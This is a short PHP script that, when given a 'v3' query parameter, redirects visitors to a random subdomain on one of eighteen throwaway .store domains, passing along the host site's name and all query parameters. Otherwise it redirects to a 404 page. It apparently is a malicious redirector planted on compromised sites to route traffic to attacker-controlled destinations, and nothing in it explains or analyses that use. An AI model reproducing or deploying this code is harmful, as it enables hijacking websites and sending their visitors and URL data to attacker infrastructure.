<?php if(isset($_GET['v3']) && $_GET['v3'] != '') {

    $domains = array('gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 'onesunwithme.store', 'popzeronickkkk.store', 'testdopioi.store', 'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'); 
    $count_domains = count($domains) - 1;
    $uniqw = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8);
    
    $baseURL = "https://".$uniqw.".".$domains[rand(0, $count_domains)]."?v1=".$_SERVER['HTTP_HOST'];
    
    $queryParams = $_GET;
    $queryString = http_build_query($queryParams);
    $redirectURL = $baseURL."&".$queryString;

    header("Location: ".$redirectURL, true, 302);
    exit;

} else {

    header("Location: /404", true, 302);
    exit;
} ?>
